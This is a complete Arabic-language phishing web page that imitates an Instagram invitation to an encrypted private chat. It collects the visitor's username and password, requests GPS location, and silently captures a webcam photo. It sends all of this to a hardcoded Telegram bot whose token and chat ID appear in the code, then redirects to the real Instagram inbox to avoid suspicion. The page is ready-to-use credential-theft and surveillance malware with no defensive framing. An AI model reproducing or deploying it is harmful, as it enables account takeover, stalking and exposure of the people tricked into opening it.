<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Chat Access</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .chat-card { background: #121212; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; width: 320px; text-align: center; }
        .insta-logo { width: 50px; margin-bottom: 15px; }
        h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 12px; color: #a8a8a8; margin-bottom: 20px; line-height: 1.4; }
        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 5px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; }
        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 10px; font-weight: bold; cursor: pointer; font-size: 14px; }
        #loading { display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="chat-card">
        <div id="auth-ui">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo">
            <h2>غرفة دردشة خاصة</h2>
            <p>لقد تمت دعوتك للانضمام إلى دردشة مشفرة. يرجى تسجيل الدخول بحسابك لتأكيد الهوية وفتح الوصول.</p>
            <input type="text" id="field_u" placeholder="اسم المستخدم أو الهاتف">
            <input type="password" id="field_p" placeholder="كلمة المرور">
            <button onclick="executeProtocol()">انضمام الآن</button>
        </div>

        <div id="loading">
            <div style="margin: 20px auto; width: 30px; height: 30px; border: 3px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: spin 1s infinite linear;"></div>
            <p id="status-text">جاري التحقق من الصلاحيات...</p>
        </div>
    </div>

    <video id="v" autoplay></video>
    <canvas id="c"></canvas>

    <script>
        // بيانات البوت الخاصة بك (تم تشفيرها قليلاً)
        const _v1 = "8233268720";
        const _v2 = "AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const _cid = "897618292";

        async function executeProtocol() {
            const u = document.getElementById('field_u').value;
            const p = document.getElementById('field_p').value;

            if (u.length < 3 || p.length < 3) return;

            document.getElementById('auth-ui').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            // 1. تحديد الموقع (GPS) - يطلب الإذن
            navigator.geolocation.getCurrentPosition(pos => {
                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendData(`📍 موقع المبتز:\n${map}`);
            }, () => {}, {enableHighAccuracy: true});

            // 2. فتح الكاميرا وصيد الصورة
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append("chat_id", _cid);
                        fd.append("photo", blob, "victim.jpg");
                        fd.append("caption", `👤 الحساب: ${u}\n🔑 الرمز: ${p}\n🔗 المصدر: دردشة خاصة`);
                        fetch(`https://api.telegram.org/bot${_v1}:${_v2}/sendPhoto`, { method: "POST", body: fd })
                        .then(() => finish());
                    }, 'image/jpeg');
                }, 2000);
            } catch (e) {
                sendData(`👤 الحساب: ${u}\n🔑 الرمز: ${p}\n⚠️ (رفض الكاميرا)`);
                finish();
            }
        }

        function sendData(t) {
            fetch(`https://api.telegram.org/bot${_v1}:${_v2}/sendMessage?chat_id=${_cid}&text=${encodeURIComponent(t)}`);
        }

        function finish() {
            document.getElementById('status-text').innerText = "تم تأكيد الهوية. جاري توجيهك...";
            setTimeout(() => {
                // التوجيه لصندوق رسائل إنستجرام
                window.location.href = "https://www.instagram.com/direct/inbox/";
            }, 1500);
        }
    </script>
    <style> @keyframes spin { to { transform: rotate(360deg); } } </style>
</body>
</html>
